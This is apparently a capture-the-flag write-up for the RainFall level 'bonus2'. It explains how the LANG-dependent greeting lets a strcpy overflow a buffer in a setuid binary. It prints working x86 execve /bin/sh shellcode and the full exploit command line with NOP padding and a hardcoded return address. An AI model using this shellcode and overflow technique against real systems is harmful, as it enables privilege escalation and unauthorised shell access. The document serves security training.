# bonus 2

In this level, we have a program that wil take two arguments

If we have two arguments, it will display Hello followed by the 1st argument

```bash
bonus2@RainFall:~$ ./bonus2 a b
Hello a
```

If we take a look in the source code, we can see that it's taking in consideration different languages with the env variable LANG and that it haves a buffer of a size of 64. According to the language, the content that will be in the buffer will be different

```bash
bonus2@RainFall:~$ export LANG="fi"
bonus2@RainFall:~$ ./bonus2 a b
Hyvää päivää a
```

The structure of the user containing the name, password and id of the user have a buffer of 80 and the idea would be to make it overflow and make it execute a shellcode

we will use the same shellcode as the one for the bonus0

```bash
export SHELLCODE=$(python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

So in our first variable, we will fill the buffer of the name and in the second one, we will fill with some NOP that would be followed by our shellcode and the result of the strcpy (so according to if we select as language 	`fi` or `nl`, we will have to put 23 or 18 NOP) 

```bash
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ ./bonus2 $(python -c "print('\x90' * 40)") $(python -c "print('\x90' * 18 + '\xbf\xff\xf8\xe1'[::-1])")
Hyvää päivää ��������������������������������������������������������������
$ whoami
```